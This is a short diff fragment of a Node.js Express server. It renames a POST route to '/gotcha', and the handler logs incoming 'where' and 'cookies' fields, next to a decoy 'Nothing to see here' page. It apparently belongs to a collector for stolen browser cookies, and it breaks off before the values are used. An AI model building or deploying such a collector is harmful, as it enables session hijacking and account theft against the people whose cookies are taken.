@@ -17,7 +17,7 @@ app.get('/', (req, res) => {
   res.send("Nothing to see here")
 })
 
-app.post('/', (req, res) => {
+app.post('/gotcha', (req, res) => {
   console.log("Got something");
   const where = req.body.where;
   const cookies = req.body.cookies;
